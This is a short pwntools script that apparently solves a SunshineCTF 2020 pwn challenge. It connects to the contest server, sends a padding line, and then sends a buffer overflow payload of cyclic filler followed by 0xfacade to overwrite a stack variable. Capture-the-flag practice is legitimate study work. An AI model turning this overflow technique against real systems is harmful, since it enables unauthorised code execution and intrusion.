import pwn

pwn.context.arch = 'amd64'
sh = pwn.remote('chal.2020.sunshinectf.org', 30001)
# sh = pwn.process('./chall_01')
p1 = "A" * 13
payload = pwn.cyclic(88) + pwn.p32(0xfacade) + pwn.p32(0xfacade)

# with open('payload', 'wb') as f:
#     f.write(payload)

sh.sendline(p1)
sh.sendline(payload)
sh.interactive()
